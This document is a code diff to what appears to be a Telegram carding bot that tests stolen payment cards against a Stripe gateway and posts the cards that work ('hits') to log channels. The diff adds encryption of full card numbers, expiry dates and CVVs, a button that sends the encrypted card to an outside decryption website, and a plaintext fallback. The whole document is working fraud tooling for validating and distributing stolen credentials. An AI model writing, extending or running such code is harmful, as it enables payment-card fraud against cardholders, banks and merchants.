@@ -28,6 +28,11 @@ import threading
 import requests
 import shutil
 from pathlib import Path
+import hashlib
+import base64
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 load_dotenv()
 
@@ -102,6 +107,9 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ==================== CONSTANTS ====================
+ENCRYPTION_SALT = os.getenv("ENCRYPTION_SALT", "darkxcode_salt_2024")
+ENCRYPTION_PASSWORD = os.getenv("ENCRYPTION_PASSWORD", "darkxcode_encryption_key")
+DECRYPTION_WEBSITE = os.getenv("DECRYPTION_WEBSITE", "https://darkxcode-decrypt.onrender.com")
 RECEIVED_FOLDER = "received"
 PUBLIC_HITS_FOLDER = "hits/public"
 PRIVATE_HITS_FOLDER = "hits/private"
@@ -309,6 +317,59 @@ def get_billing_address(card_bin=""):
         country = "US"
 
     return random.choice(BILLING_ADDRESSES[country])
+    
+def generate_encryption_key():
+    """Generate encryption key from password"""
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=ENCRYPTION_SALT.encode(),
+        iterations=100000,
+    )
+    key = base64.urlsafe_b64encode(kdf.derive(ENCRYPTION_PASSWORD.encode()))
+    return key
+
+# Global encryption key
+ENCRYPTION_KEY = generate_encryption_key()
+cipher = Fernet(ENCRYPTION_KEY)
+
+def encrypt_card_data(card_string):
+    """Encrypt card data for channel forwarding"""
+    try:
+        encrypted_bytes = cipher.encrypt(card_string.encode())
+        encrypted_text = base64.urlsafe_b64encode(encrypted_bytes).decode()
+        
+        # Create unique format: DXC_ENCRYPTED_{encrypted_data}
+        return f"DXC_ENCRYPTED_{encrypted_text}"
+    except Exception as e:
+        logger.error(f"Encryption error: {e}")
+        # Fallback: simple base64 encoding
+        return f"DXC_BASE64_{base64.b64encode(card_string.encode()).decode()}"
+
+def decrypt_card_data(encrypted_string):
+    """Decrypt card data (for website use)"""
+    try:
+        if encrypted_string.startswith("DXC_ENCRYPTED_"):
+            encrypted_text = encrypted_string.replace("DXC_ENCRYPTED_", "")
+            encrypted_bytes = base64.urlsafe_b64decode(encrypted_text)
+            decrypted_bytes = cipher.decrypt(encrypted_bytes)
+            return decrypted_bytes.decode()
+        elif encrypted_string.startswith("DXC_BASE64_"):
+            encoded_text = encrypted_string.replace("DXC_BASE64_", "")
+            return base64.b64decode(encoded_text).decode()
+        else:
+            return encrypted_string  # Already plain text
+    except Exception as e:
+        return f"DECRYPTION_ERROR: {str(e)}"
+
+def create_decryption_button(encrypted_card):
+    """Create inline button for decryption website"""
+    # URL encode the encrypted card
+    import urllib.parse
+    encoded_card = urllib.parse.quote(encrypted_card)
+    decryption_url = f"{DECRYPTION_WEBSITE}/?data={encoded_card}"
+    
+    return InlineKeyboardButton("🔓 Decrypt Card", url=decryption_url)
     
 def get_credit_cost(status):
     """Get credit cost based on status"""
@@ -3708,11 +3769,15 @@ def save_hit_card(user_id: int, card: str, status: str, is_private: bool = False
         logger.error(f"Error saving hit card: {e}")
 
 async def send_to_log_channel(context, card: str, status: str, message: str, username: str, time_taken: float, is_private: bool = False):
-    """Send exact same hit format to channel"""
+    """Send encrypted hits to channel with decryption button"""
     try:
         # Parse card
         cc, mon, year, cvv = card.split("|")
         cc_clean = cc.replace(" ", "")
+        
+        # Encrypt the card data
+        original_card = f"{cc}|{mon}|{year}|{cvv}"
+        encrypted_card = encrypt_card_data(original_card)
         
         # Get BIN info
         bin_info = get_bin_info(cc_clean[:6])
@@ -3725,9 +3790,9 @@ async def send_to_log_channel(context, card: str, status: str, message: str, use
             channel_id = APPROVED_LOG_CHANNEL
             channel_label = "PUBLIC"
         
-        # Create the EXACT SAME format as user sees
-        result_text = f"""
-[↯] Card: <code>{cc}|{mon}|{year}|{cvv}</code>
+        # Create encrypted message for channel
+        channel_text = f"""
+[↯] Card: <code>{encrypted_card}</code>
 [↯] Status: {status.capitalize()}
 [↯] Response: {message}
 [↯] Gateway: Stripe Auth
@@ -3742,16 +3807,51 @@ async def send_to_log_channel(context, card: str, status: str, message: str, use
 [↯] Bot: @DARKXCODE_STRIPE_BOT
 """
         
-        # Send to channel
+        # Create inline keyboard with decrypt button
+        keyboard = [[create_decryption_button(encrypted_card)]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        # Send to channel with button
         await context.bot.send_message(
             chat_id=channel_id,
-            text=result_text,
-            parse_mode=ParseMode.HTML
+            text=channel_text,
+            parse_mode=ParseMode.HTML,
+            reply_markup=reply_markup
         )
-        logger.info(f"✓ Forwarded {channel_label} {status} hit to channel")
+        
+        # Send plain version to user (if they checked it)
+        # This should already be handled by the main check functions
+        
+        logger.info(f"✓ Forwarded ENCRYPTED {channel_label} {status} hit to channel")
         
     except Exception as e:
-        logger.error(f"Error sending to channel: {e}")
+        logger.error(f"Error sending encrypted to channel: {e}")
+        # Fallback: send plain text
+        try:
+            # Send plain version as fallback
+            original_card = f"{cc}|{mon}|{year}|{cvv}"
+            fallback_text = f"""
+[↯] Card: <code>{original_card}</code>
+[↯] Status: {status.capitalize()}
+[↯] Response: {message}
+[↯] Gateway: Stripe Auth
+- - - - - - - - - - - - - - - - - - - - - -
+[↯] Bank: {bin_info['bank']}
+[↯] Country: {bin_info['country']} {bin_info['country_flag']}
+- - - - - - - - - - - - - - - - - - - - - -
+[↯] 𝐓𝐢𝐦𝐞: {time_taken:.2f}s
+- - - - - - - - - - - - - - - - - - - - - -
+[↯] User : @{username or 'N/A'}
+[↯] Made By: @ISHANT_OFFICIAL
+[↯] Bot: @DARKXCODE_STRIPE_BOT
+"""
+            await context.bot.send_message(
+                chat_id=channel_id,
+                text=fallback_text,
+                parse_mode=ParseMode.HTML
+            )
+        except Exception as e2:
+            logger.error(f"Fallback also failed: {e2}")
 
 async def handle_file_upload_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle file upload messages for both public and private checks"""
